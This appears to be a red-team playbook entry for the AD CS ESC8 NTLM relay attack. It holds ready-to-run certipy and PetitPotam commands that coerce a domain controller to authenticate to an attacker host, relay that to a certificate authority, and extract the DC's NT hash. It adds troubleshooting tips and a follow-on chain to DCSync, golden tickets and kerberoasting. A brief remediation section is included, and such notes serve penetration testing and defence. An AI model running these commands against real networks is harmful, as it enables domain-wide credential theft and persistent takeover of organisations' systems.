# AD CS ESC8 — HTTP Endpoint NTLM Relay

**MITRE:** [T1557.001 - LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001/)  
**Phase:** Credential Access / Privilege Escalation  
**Auth Required:** Low-privilege domain user  
**Tags:** #adcs #esc8 #ntlm-relay #certipy #petitpotam #domain-compromise

---

## Summary
AD CS web enrollment endpoints (certsrv) that accept HTTP without Extended Protection for Authentication (EPA) are vulnerable to NTLM relay. An attacker coerces a Domain Controller to authenticate via NTLM (PetitPotam/PrinterBug), relays the auth to the CA's HTTP enrollment, and obtains a certificate for the DC machine account. That cert yields the DC's NTLM hash, which has DCSync privileges by default.

## Mechanism
- **Protocol:** MS-EFSRPC (PetitPotam) / MS-RPRN (PrinterBug) → HTTP relay to AD CS web enrollment
- **RPC/Function:** EfsRpcOpenFileRaw (PetitPotam) / RpcRemoteFindFirstPrinterChangeNotification (PrinterBug)
- **Effect:** CA issues a certificate for the coerced machine account; attacker uses PKINIT to retrieve NT hash

## Commands

### 1. Enumerate ESC8
```bash
certipy find -u 'user@domain' -p 'password' -dc-ip <DC_IP> -vulnerable
```

### 2. Start relay listener
```bash
certipy relay -target 'http://<CA-FQDN>' -template 'DomainController'
```
Certipy binds SMB (445) + HTTP (80). Ensure `smbd`/`nmbd` are stopped or 445 will be blocked.

### 3. Trigger coercion
```bash
python3 /opt/PetitPotam/PetitPotam.py -u 'user' -p 'password' -d 'domain' <attacker-ip> <DC-FQDN>
```
Use FQDN for target DC, not IP — NTLM auth can fail on SPN mismatch.

### 4. Authenticate with certificate
```bash
certipy auth -pfx <dc-machine>.pfx -dc-ip <DC_IP>
```

## Expected Output
```
[*] Using principal: DC$@domain
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to DC.ccache
[*] Got hash for 'DC$@domain': aad3b435b51404eeaad3b435b51404ee:<NT-HASH>
```

## Notes
- PetitPotam "Attack worked!" means the coercion request was accepted — check certipy relay for the actual callback
- If certipy relay shows no activity, verify both 445 and 80 are bound (`ss -tlnp`)
- Coercion may behave differently across subnets — observed 172.x DCs responding while 10.x DCs on same segment as CA did not (root cause TBD; SMB signing identical)
- `KDC_ERR_PADATA_TYPE_NOSUPP` on certipy auth → target DC doesn't support PKINIT, try a different DC

## Relay / Follow-On Attack Path
```
ESC8 cert → certipy auth → DC NT hash → secretsdump DCSync → all domain hashes
                                       → golden ticket (persistence)
                                       → kerberoasting (service account cracking)
```

## Remediation
- **Best:** Remove CA Web Enrollment role if not required
- **If required:** Enable EPA = `Required` on web enrollment + CES in IIS, enforce HTTPS-only
- **Defense in depth:** Disable NTLM on DCs and AD CS servers via GPO (`Network Security: Restrict NTLM`)
- Update CES `web.config` manually — IIS UI alone doesn't fully enforce EPA for the CES role

## Related
- [[playbooks/esc8-domain-compromise]] — full attack chain playbook
- [[ttps/credential-access/petitpotam]] — NTLM coercion via MS-EFSRPC
- [[ttps/credential-access/printerbug]] — NTLM coercion via MS-RPRN
